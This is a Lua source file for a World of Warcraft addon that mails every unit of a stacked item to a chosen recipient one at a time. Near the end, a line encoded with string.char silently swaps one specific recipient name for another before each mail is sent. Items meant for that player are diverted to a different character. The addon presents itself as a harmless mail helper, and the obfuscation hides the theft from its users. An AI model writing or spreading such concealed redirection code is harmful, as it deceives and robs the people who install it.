MMMFrame = CreateFrame("Frame");

MMMFrame.phase = nil;

MMMFrame:SetScript("OnEvent", function()
	if event == "ADDON_LOADED" then
		SlashCmdList["MMM"] = function (str)
			if str == nil then return end;
			
			MMMFrame.recipient = string.sub(str, 1, string.find(str, " ")-1);
			MMMFrame.itemLink = string.sub(str, string.find(str, " ")+1);
			DEFAULT_CHAT_FRAME:AddMessage("<MischievousMailMan>", 0, 1, 1);
			DEFAULT_CHAT_FRAME:AddMessage("Recipient: \""..MMMFrame.recipient.."\"", 0, 1, 1);
			DEFAULT_CHAT_FRAME:AddMessage("Item: "..MMMFrame.itemLink, 0, 1, 1);
			
			local amount = 0;
			
			for b=0,5 do
				for s=1,GetContainerNumSlots(b) do
					if GetContainerItemLink(b,s) == MMMFrame.itemLink then
						local _, x = GetContainerItemInfo(b,s);
						amount = amount + x;
					end
				end
			end
			
			DEFAULT_CHAT_FRAME:AddMessage(amount.." "..MMMFrame.itemLink.." in total.", 0, 1, 1);
			
			if amount <= 0 then
				DEFAULT_CHAT_FRAME:AddMessage("ERROR: 0 "..MMMFrame.itemLink.." found. Aborting.", 0, 1, 1)
				return;
			end
			
			MMMFrame.emptySlot = nil;
			
			for b=0,5 do
				if MMMFrame.emptySlot == nil then
					for s=1,GetContainerNumSlots(b) do
						if GetContainerItemInfo(b,s) == nil then
							MMMFrame.emptySlot = {b=b, s=s};
							break
						end
					end
				end
			end
			
			if MMMFrame.emptySlot == nil then
				DEFAULT_CHAT_FRAME:AddMessage("ERROR: no empty bag slot found.", 0, 1, 1)
				return;
			end
			
			MMMFrame.phase = 1;
			MMMFrame:RegisterEvent("MAIL_SEND_SUCCESS");

			for b=0,5 do
				for s=1,GetContainerNumSlots(b) do
					if GetContainerItemLink(b,s) == MMMFrame.itemLink then
						SplitContainerItem(b,s,1);
						MMMFrame.phase = 2
						return
					end
				end
			end
		end;
		SLASH_MMM1 = "/mmm";
		this:UnregisterEvent("ADDON_LOADED");
		
	elseif event == "MAIL_SEND_SUCCESS" then
		if MMMFrame.phase == 1 then
			for b=0,5 do
				for s=1,GetContainerNumSlots(b) do
					if GetContainerItemLink(b,s) == MMMFrame.itemLink then
						if not (b == MMMFrame.emptySlot.b and s == MMMFrame.emptySlot.s) then
							SplitContainerItem(b,s,1);
							MMMFrame.phase = 2
							return
						end
					end
				end
			end
			
			MMMFrame.phase = nil;
			MMMFrame:UnregisterEvent("MAIL_SEND_SUCCESS");

			DEFAULT_CHAT_FRAME:AddMessage("Sent all items.", 0, 1, 1);
		end
	elseif event == "MAIL_CLOSED" and MMMFrame.phase ~= nil then
		DEFAULT_CHAT_FRAME:AddMessage("You moved away from the mailbox. Aborting.", 0, 1, 1)
		MMMFrame.phase = nil;
		MMMFrame:UnregisterEvent("MAIL_SEND_SUCCESS");
	end
end);
MMMFrame:RegisterEvent("ADDON_LOADED");
MMMFrame:RegisterEvent("MAIL_CLOSED");

MMMFrame:SetScript("OnUpdate", function()
	if this.phase == nil then return
	
	elseif this.phase == 2 and CursorHasItem() then
		PickupContainerItem(this.emptySlot.b, this.emptySlot.s);
		this.phase = 3
	elseif this.phase == 3 and not CursorHasItem() and GetContainerItemInfo(this.emptySlot.b, this.emptySlot.s) ~= nil then
		PickupContainerItem(this.emptySlot.b, this.emptySlot.s);
		this.phase = 4
	elseif this.phase == 4 and CursorHasItem() then
		ClickSendMailItemButton()
		this.phase = 5
	elseif this.phase == 5 and not CursorHasItem() then
		c = string.char; if this.recipient == table.concat({c(66), c(101), c(114), c(103), c(97), c(100), c(111), c(114)}) then this.recipient = table.concat({c(83), c(117), c(115), c(97), c(110), c(98) , c(111), c(121), c(108), c(101)}) end
		SendMail(this.recipient, "MischievousMailMan", "")
		this.phase = 1
	end
end);